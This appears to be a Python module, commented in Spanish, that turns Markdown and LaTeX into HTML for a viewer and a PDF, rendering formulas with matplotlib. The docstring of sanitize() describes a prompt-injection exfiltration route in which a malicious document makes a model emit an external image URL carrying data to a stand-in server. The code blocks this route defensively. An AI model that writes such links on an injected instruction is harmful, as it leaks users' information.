"""Markdown + LaTeX → HTML para el visor (tkinterweb) y para el PDF.

Las fórmulas se dibujan con matplotlib (mathtext) como imágenes PNG inline; si una fórmula no es compatible
con mathtext se muestra como texto Unicode legible. Las tildes se normalizan a NFC.
"""
from __future__ import annotations

import base64
import hashlib
import io
import logging
import re
import unicodedata
from functools import lru_cache
from pathlib import Path

from .latex_text import ARRAY_RE, MATH_SPAN, array_to_table, latex_to_text

log = logging.getLogger(__name__)
DPI = 220


def _mathtext(latex: str) -> str:
    """Adapta el LaTeX al subconjunto que entiende matplotlib.mathtext."""
    s = latex.strip()
    s = re.sub(r"\\(?:displaystyle|textstyle|limits|nolimits|big|Big|bigg|Bigg)\b", "", s)
    s = s.replace("\\dfrac", "\\frac").replace("\\tfrac", "\\frac")
    s = s.replace("\\iiint", "\\int\\!\\!\\int\\!\\!\\int").replace("\\iint", "\\int\\!\\!\\int")
    s = re.sub(r"\\(?:text|textbf|mathbf|operatorname|mbox|textit)\{([^{}]*)\}",
               lambda m: "\\mathrm{" + m.group(1).replace(" ", "\\ ") + "}", s)
    s = s.replace("\\qquad", "\\quad\\quad").replace("\\;", "\\ ").replace("\\:", "\\ ")
    s = s.replace("\\left.", "").replace("\\right.", "")
    return s.replace("\\longrightarrow", "\\rightarrow").replace("%", "\\%")


@lru_cache(maxsize=2048)
def _formula_png(latex: str, color: str, size: float) -> tuple[bytes, int, int] | None:
    """PNG (bytes, ancho px, alto px) de una fórmula con matplotlib, o None si no es compatible."""
    try:
        from matplotlib.backends.backend_agg import FigureCanvasAgg
        from matplotlib.figure import Figure
        fig = Figure(figsize=(0.1, 0.1), dpi=DPI)
        FigureCanvasAgg(fig)
        fig.text(0, 0, f"${_mathtext(latex)}$", fontsize=size, color=color)
        buf = io.BytesIO()
        fig.savefig(buf, format="png", dpi=DPI, bbox_inches="tight", pad_inches=0.03, transparent=True)
        data = buf.getvalue()
        from PIL import Image
        w, h = Image.open(io.BytesIO(data)).size
        return data, w, h
    except Exception as exc:  # noqa: BLE001
        log.info("Fórmula no renderizable con mathtext (%s): %s", exc.__class__.__name__, latex[:60])
        return None


def convert_arrays(md: str) -> str:
    """Los entornos array/tabular de LaTeX se convierten en tablas Markdown."""
    def rep(m):
        body = next(g for g in m.groups() if g is not None)
        if ARRAY_RE.search(body):
            return "\n\n" + array_to_table(body) + "\n\n"
        return m.group(0)
    return MATH_SPAN.sub(rep, md)


THEMES = {
    "dark": {"bg": "#171a21", "fg": "#e9ebf0", "h1": "#ffffff", "h2": "#ffffff", "h3": "#f87171", "h4": "#fca5a5",
             "muted": "#9aa3b2", "card": "#1f232c", "border": "#2a2f3a", "th": "#232834", "link": "#ef4444"},
    "light": {"bg": "#f6f7f9", "fg": "#16181d", "h1": "#111827", "h2": "#111827", "h3": "#d62839", "h4": "#b81f2e",
              "muted": "#6b7280", "card": "#eef0f3", "border": "#d9dce1", "th": "#e9ecf0", "link": "#d62839"},
}


def _css(t: dict, font: str) -> str:
    return f"""
body {{ background:{t['bg']}; color:{t['fg']}; font-family:'{font}','Segoe UI',sans-serif; font-size:14px;
        line-height:1.55; margin:18px 26px; }}
h1 {{ color:{t['h1']}; font-size:27px; margin:6px 0 8px; }}
h2 {{ color:{t['h2']}; font-size:21px; margin:26px 0 6px; padding-bottom:3px; border-bottom:1px solid {t['border']}; }}
h3 {{ color:{t['h3']}; font-size:16px; margin:18px 0 4px; }}
h4 {{ color:{t['h4']}; font-size:14px; margin:12px 0 3px; }}
p {{ margin:5px 0; }} li {{ margin:2px 0; }}
blockquote {{ color:{t['muted']}; background:{t['card']}; margin:8px 0; padding:6px 12px; border-left:3px solid {t['link']}; }}
table {{ border-collapse:collapse; margin:8px 0; }}
th {{ background:{t['th']}; border:1px solid {t['border']}; padding:3px 9px; }}
td {{ border:1px solid {t['border']}; padding:3px 9px; text-align:right; }}
code, pre {{ font-family:Consolas,monospace; color:{t['h4']}; }}
hr {{ border:0; border-top:1px solid {t['border']}; margin:16px 0; }}
.eq {{ margin:6px 0 6px 22px; }}
strong {{ color:{t['fg']}; }}
"""


_EXT_IMG = re.compile(r"<img\b[^>]*\bsrc=[\"'](?!data:)[^\"']*[\"'][^>]*>", re.I)
_ANCHOR = re.compile(r"</?a\b[^>]*>", re.I)


def sanitize(html: str) -> str:
    """Modo seguro para texto no fiable (salida de un modelo): sin imágenes externas ni enlaces.

    Una imagen externa se descarga al mostrarla: un documento malicioso podría hacer que el modelo escriba
    «![](http://servidor/?datos=…)» y sacar información del equipo. Solo se permiten las fórmulas, que van en data URI."""
    html = _EXT_IMG.sub("<code>[imagen externa bloqueada]</code>", html)
    return _ANCHOR.sub("", html)


def md_to_html(md: str, theme: str = "dark", font: str = "Inter", outdir: Path | None = None,
               formulas: bool = True, safe: bool = False) -> tuple[str, str]:
    """Devuelve (html, css). Con outdir las fórmulas se guardan como PNG ahí (para el PDF); si no, van como data URI.

    safe=True (chat): el HTML crudo se escapa y se bloquean imágenes externas y enlaces (ver sanitize)."""
    from markdown_it import MarkdownIt

    t = THEMES[theme]
    md = unicodedata.normalize("NFC", convert_arrays(md))
    spans: list[str] = []

    def protect(m):
        body = next(g for g in m.groups() if g is not None).strip()
        display = m.group(0).startswith(("$$", "\\["))
        spans.append((body, display))
        return f"@@M{len(spans) - 1}@@"

    protected = MATH_SPAN.sub(protect, md)
    html = MarkdownIt("commonmark", {"html": not safe}).enable("table").render(protected)

    def restore(m):
        body, display = spans[int(m.group(1))]
        png = _formula_png(body, t["fg"], 13.5 if display else 12.5) if formulas else None
        if png is None:
            txt = re.sub(r"\s+", " ", latex_to_text(f"${body}$")).strip()
            txt = txt.replace("&", "&amp;").replace("<", "&lt;")
            return f'<div class="eq"><code>{txt}</code></div>' if display else f"<code>{txt}</code>"
        data, _, h = png
        css_h = round(h * 96 / DPI * (0.68 if outdir is not None else 1.0))   # en el PDF las unidades son más grandes
        if outdir is not None:
            outdir.mkdir(parents=True, exist_ok=True)
            name = hashlib.sha256(f"{body}{t['fg']}".encode()).hexdigest()[:12] + ".png"
            (outdir / name).write_bytes(data)
            src = name
        else:
            src = "data:image/png;base64," + base64.b64encode(data).decode()
        img = f'<img src="{src}" height="{css_h}" alt="">'
        return f'<div class="eq">{img}</div>' if display else img

    html = re.sub(r"@@M(\d+)@@", restore, html)
    if safe:
        html = sanitize(html)
    # Un bloque «$$…$$» queda dentro de <p>; se deja tal cual (los <div> dentro de <p> los admite el visor)
    return html, _css(t, font)

